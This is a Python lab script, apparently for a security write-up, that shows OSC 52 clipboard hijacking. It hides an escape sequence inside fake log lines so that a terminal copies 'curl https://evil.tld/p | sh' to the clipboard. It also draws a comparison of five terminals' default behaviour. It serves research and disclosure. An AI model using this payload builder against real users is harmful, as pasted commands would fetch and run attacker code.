"""实验B：OSC 52 剪贴板劫持 - 生成 payload 截图 + 五终端对照矩阵。"""
import os, sys, base64
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from render.render_ansi import render_bytes
from render.fonts import load_font as _font
from PIL import Image, ImageDraw, ImageFont

LAB = os.path.dirname(os.path.abspath(__file__))
ASSETS = os.path.join(LAB, "assets", "terminal-escape")
os.makedirs(ASSETS, exist_ok=True)

def osc52(text, clip="c"):
    b64 = base64.b64encode(text.encode("utf-8")).decode("ascii")
    return f"\x1b]52;{clip};{b64}\x07".encode("utf-8")

def run():
    print("[B] OSC 52 clipboard hijack")
    evil = "curl https://evil.tld/p | sh"
    payload = (b"[INFO] 2026-10-14 09:30:01 health check ok\n"
               + osc52(evil)
               + b"\n[INFO] 2026-10-14 09:30:02 done\n")
    # raw + 渲染
    with open(os.path.join(ASSETS, "04-osc52-payload.bin"), "wb") as f:
        f.write(payload)
    render_bytes(payload, "实验B：OSC 52 剪贴板注入 payload",
                 os.path.join(ASSETS, "04-osc52-payload.png"),
                 cols=72, rows=8)
    print("  [shot] 04-osc52-payload.png")

    # 五终端对照矩阵
    terminals = [
        ("Windows Terminal 1.21", True),
        ("xterm.js (VSCode/Cursor)", True),
        ("iTerm2 3.5", True),
        ("WezTerm 20240203", True),
        ("Alacritty 0.13", False),
    ]
    _matrix(terminals, evil)
    print()

def _matrix(terminals, evil_text):
    font = _font(16); big = _font(20)
    cell_h = 110; pad = 30
    label_w = 280; term_w = 380; clip_w = 380; status_w = 90
    W = pad*2 + label_w + status_w + term_w + clip_w + 60
    H = pad*2 + 80 + cell_h * len(terminals)
    img = Image.new("RGB", (W, H), (18,18,24))
    d = ImageDraw.Draw(img)
    d.rectangle([0,0,W,50], fill=(48,54,72))
    d.text((pad, 14), "实验B：OSC 52 五终端对照矩阵", fill=(230,230,240), font=big)
    y0 = 70
    for h, x in [("终端", pad), ("OSC52", pad+label_w+10),
                 ("终端渲染效果", pad+label_w+10+status_w+10),
                 ("Ctrl+V 粘贴结果", pad+label_w+10+status_w+10+term_w+10)]:
        d.text((x, y0), h, fill=(180,180,200), font=font)
    d.line([pad, y0+24, W-pad, y0+24], fill=(80,80,100))
    for i, (name, enabled) in enumerate(terminals):
        y = y0 + 36 + i*cell_h
        d.text((pad, y+8), name, fill=(220,220,230), font=font)
        if enabled:
            d.text((pad+label_w+10, y+8), "ON", fill=(255,120,120), font=font)
            d.text((pad+label_w+10, y+34), "(默认开)", fill=(200,140,140), font=font)
        else:
            d.text((pad+label_w+10, y+8), "OFF", fill=(120,220,140), font=font)
            d.text((pad+label_w+10, y+34), "(默认关)", fill=(140,200,150), font=font)
        tx = pad+label_w+10+status_w+10
        d.rectangle([tx, y, tx+term_w, y+cell_h-20], fill=(30,30,38), outline=(60,60,80))
        if enabled:
            d.text((tx+10, y+10), "[INFO] health check ok", fill=(120,200,120), font=font)
            d.text((tx+10, y+34), "[INFO] done", fill=(120,200,120), font=font)
            d.text((tx+10, y+58), "(OSC52 已解释，序列不可见)", fill=(140,140,160), font=font)
        else:
            d.text((tx+10, y+10), "[INFO] health check ok", fill=(120,200,120), font=font)
            d.text((tx+10, y+34), "^[[52;c;Y3VybCBo...==^G", fill=(200,120,120), font=font)
            d.text((tx+10, y+58), "(序列被拒绝，原样显示)", fill=(140,140,160), font=font)
        cx = pad+label_w+10+status_w+10+term_w+10
        d.rectangle([cx, y, cx+clip_w, y+cell_h-20], fill=(40,40,48), outline=(80,80,100))
        d.text((cx+10, y+10), "Ctrl+V ->", fill=(160,160,180), font=font)
        if enabled:
            d.text((cx+10, y+34), evil_text, fill=(255,100,100), font=font)
        else:
            d.text((cx+10, y+34), "(原剪贴板不变)", fill=(120,200,140), font=font)
    out = os.path.join(ASSETS, "04-osc52-matrix.png")
    img.save(out)
    print("  [shot] 04-osc52-matrix.png")

if __name__ == "__main__":
    run()
